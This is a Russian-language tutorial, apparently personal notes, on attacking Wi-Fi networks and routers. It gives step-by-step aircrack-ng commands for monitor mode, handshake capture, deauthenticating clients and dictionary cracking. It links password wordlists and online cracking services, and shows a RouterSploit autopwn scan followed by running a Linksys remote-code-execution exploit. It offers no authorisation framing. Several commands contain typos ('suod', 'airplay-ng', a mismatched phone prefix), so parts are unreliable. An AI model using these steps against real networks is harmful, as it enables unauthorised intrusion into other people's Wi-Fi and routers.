# Безопасность беспроводных систем

## Выбор и покупка оборудования

Для обнаружения и взлома точек доступа Wi-Fi необходимо купить внешний адаптер сетевой адаптер. Т.к. обычно встроеные модули в ноутбуках/телефонах могут оказаться бесполезными из-за того, что их чип нельзя переключить в режим мониторинга и внедрения пакетов.

Рекомендуемое обоудование:
* Alfa AWUS036NH — усилитель повышенной мощности, разработан для подключения к точкам доступа, расположенных на значительном расоянии.
* Alfa AWUS036ACH — широкодиапозонный беспроводной USB-адаптер

## Популярные способы взлома Wi-Fi. Aircrack-ng 

1. Нужно получить название сетевого адаптера командой
```bash
ifconfig
```
2. Для режима моноринга нужно отключить все сетевые интерфейсы и программы которые могут помашать:
```bash
sudo airmon-ng check kill
```
В выводе будет список PID которын нужно отлкючить (командой `kill`)
3. Отключить сетевой менеджер:
```bash
sudo service network-manager stop
sudo config <имя адаптера из 1.> down
```
4. Нужно запустить сетевой адаптер через airmon-ng
```bash
suod airmon-ng start <имя адаптера из 1.>
```
В ответе будет что-то вроде:
```
monitor mode vif enabled on [phy12]wlan0mon
```
то что будет на месте wlan0mon нужно скопировать, оно будет использоваться дальше. Проверить, что режим монторинга включен:
```bash
suod airmon-ng start <значение из 4.>
```
5. Посмотреть доступные Wi-Fi точки:
```bash
sudo airodump-ng wlan0mon
```
Команда просканирует все доступные Wi-Fi точки. После обнаружения целевой точки скнарирование можно останавливать сочетанием `ctrl+c`, из данных о точках нужно скопировать BSSID и CH (канал)
6. Запустить атаку на точку доступа:
```bash
sudo airodump-ng -c <канал из 5.> --bssid <BSSID из 5.> -w WPAcrack <значение из 4.> --ignore-negative-one
```
Команда запустит отлов хэндшейков. Как только он будет найден команду можно остановить сочетанием `ctrl+c`.
Если получить не получается, то можно попробовать инициировать его самостоятельно, отключив подключенные устройства командой:
```
sudo airplay-ng --deauth 100 -a <BSSID из 5.> <значение из 4.> --ignore-negative-one
```
7. Хендшейк будет лежать в текущей директории в файле с расширением `.cap`.
Необходимо подобрать пароль используя словарь:
```bash
sudo aircrack-ng -w <путь к ловарю> -b <BSSID из 5.> <путь к файлу к хендшейком>.cap
```

## Словари для брута

Словари:
* [ТОП пароли Wi-Fi для WPA, WPA2, WPA3](https://yadi.sk/d/9hGeMZIngIRDww)
* [ТОП 9 миллионов](https://yadi.sk/d/h5fuJAtmQgyJIA)
* [Даты и дни рождения](https://yadi.sk/d/7IaaUM4OIYBMtA)
* [8-значные цифры](https://yadi.sk/d/3t3XrVsxthu__Q)
* [9-значные цифры](https://yadi.sk/d/Qgv9-hNN6NV3cg)

### Генерация своего словаря

Crunch — генератор словарей по маске. 

Генерация словаря для номера телефона (начинающегося на 8919):
```bush
crunch 11 11 -t 8918%%%%%%% -o telefon
```
здесь:
* 11 ­— минимальное количество символов
* 11 ­— максимальное количество символов
* -t — маска, символ `%` — любое число
* -o — запись в файл

### Онлайн сервисы для перебора перебора пароля

* [OnlineHashCrack](https://www.onlinehashcrack.com/) — подбирает по первым 20миллионам слов бесплатно.
* [GPUHASH.me](https://gpuhash.me/) — отправляет результат по почте, попытка подбора занимает около 2х часов.
* [xsrc](https://xsrc.ru/) — аналогичен GPUHASH.me, только платный (100Р подбор).

## RouterSploit

RouterSploit — фреймворк с открытым исходным кодом, позволяет зайти в админ панель роутера. 

Установка:
```bash
git clone https://github.com/threat9/routersploit
cd routersploit
python3 -m pip install setuptools
python3 -m pip install -r requirments.txt
python3 rsf.py
```

#### Пример взлома

1. Запустить RouterSploit:
```bash
python3 rsf.py
```
2. Использовать сканер:
```
use scanners/autopwn
```
3. Посмотреть текущие настройки сканера:
```
show options
```
изменить цель:
```
set target <адрес роутера>
```
4. Запустить сканер:
```
run
```
В ответе будет отображен список эксплоитов для роутера, нужно выбрать любой из списка, например `exploit/routers/linksys/eseries_themoon_rce`
5. Используем эксплоит:
```
use exploit/routers/linksys/eseries_themoon_rce
```
6. Посмотреть текущие настройки:
```
show options
```
изменить цель:
```
set target <адрес роутера>
```
7. Запустить проверку:
```
check
```
8. Запустить эксплоит:
```
run
```

## Дполнительно

[Диапозоны IP адресов](https://www.4it.me)
